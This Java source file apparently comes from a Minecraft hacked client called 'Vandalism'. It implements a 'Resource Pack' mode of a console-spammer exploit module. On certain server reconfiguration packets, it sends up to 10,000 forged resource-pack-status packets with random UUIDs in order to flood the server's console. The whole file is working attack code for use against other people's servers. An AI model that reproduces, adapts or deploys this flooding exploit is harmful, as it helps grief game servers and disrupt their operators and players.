/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Verschlxfene, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.consolespammer.impl;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.event.cancellable.network.IncomingPacketListener;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.consolespammer.ConsoleSpammerModule;
import de.nekosarekawaii.vandalism.feature.module.template.module.ModuleMulti;
import net.minecraft.network.packet.c2s.common.ResourcePackStatusC2SPacket;
import net.minecraft.network.packet.s2c.config.ReadyS2CPacket;
import net.minecraft.network.packet.s2c.play.EnterReconfigurationS2CPacket;

import java.util.UUID;

public class ResourcePackModuleMode extends ModuleMulti<ConsoleSpammerModule> implements IncomingPacketListener {

    private final IntegerValue times = new IntegerValue(
            this,
            "Times",
            "The amount of times the function should be executed.",
            100,
            1,
            10000
    );

    public ResourcePackModuleMode(final ConsoleSpammerModule parent) {
        super("Resource Pack", parent);
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(IncomingPacketListener.IncomingPacketEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(IncomingPacketListener.IncomingPacketEvent.ID, this);
    }

    @Override
    public void onIncomingPacket(final IncomingPacketListener.IncomingPacketEvent event) {
        if (event.packet instanceof EnterReconfigurationS2CPacket || event.packet instanceof ReadyS2CPacket) {
            for (int i = 0; i < this.times.getValue(); i++) {
                event.connection.send(new ResourcePackStatusC2SPacket(
                        UUID.randomUUID(),
                        ResourcePackStatusC2SPacket.Status.SUCCESSFULLY_LOADED
                ), null, true);
            }
        }
    }

}
